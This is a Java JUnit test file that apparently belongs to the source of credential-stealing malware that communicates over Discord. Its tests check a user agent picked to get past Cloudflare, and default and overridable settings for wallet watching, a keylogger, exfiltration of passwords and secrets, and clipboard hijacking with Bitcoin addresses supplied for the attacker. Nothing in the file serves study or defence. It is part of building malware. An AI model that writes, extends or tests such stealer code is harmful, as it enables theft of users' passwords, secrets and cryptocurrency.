package com.spcagentpayloa.jvmxx;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;

class DiscordConfigTest {
	@AfterEach
	void reset() {
		DiscordConfig.reset();
	}

	@Test
	void userAgentIsNotBrowserShaped() {
		// Cloudflare answers 40333 to a Mozilla UA from the JDK TLS stack.
		assertFalse(DiscordConfig.USER_AGENT.startsWith("Mozilla/5.0"));
		assertTrue(DiscordConfig.USER_AGENT.startsWith("DiscordBot"));
	}

	@Test
	void provisioningDefaults() {
		DiscordConfig.provisioning(Map.of());
		assertTrue(DiscordConfig.walletsWatch());
		assertTrue(DiscordConfig.keylogger());
		assertTrue(DiscordConfig.sendPasswords());
		assertTrue(DiscordConfig.clipboard());
		assertTrue(DiscordConfig.sendSecrets());
		assertTrue(DiscordConfig.provisionedCoins().isEmpty());
	}

	@Test
	void provisioningOverridesAndValidates() {
		DiscordConfig.provisioning(Map.of(
			"wallets", Map.of("watch", false),
			"keylogger", Map.of("enabled", false, "sendPasswords", false),
			"clipboard", Map.of("enabled", false, "sendSecrets", false, "coins", Map.of(
				"btc", List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu", "no-valida"),
				"nope", List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu")))));
		assertFalse(DiscordConfig.walletsWatch());
		assertFalse(DiscordConfig.keylogger());
		assertFalse(DiscordConfig.sendPasswords());
		assertFalse(DiscordConfig.clipboard());
		assertFalse(DiscordConfig.sendSecrets());
		assertEquals(List.of("16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu"), DiscordConfig.provisionedCoins().get("btc"));
		assertFalse(DiscordConfig.provisionedCoins().containsKey("nope"));
	}
}
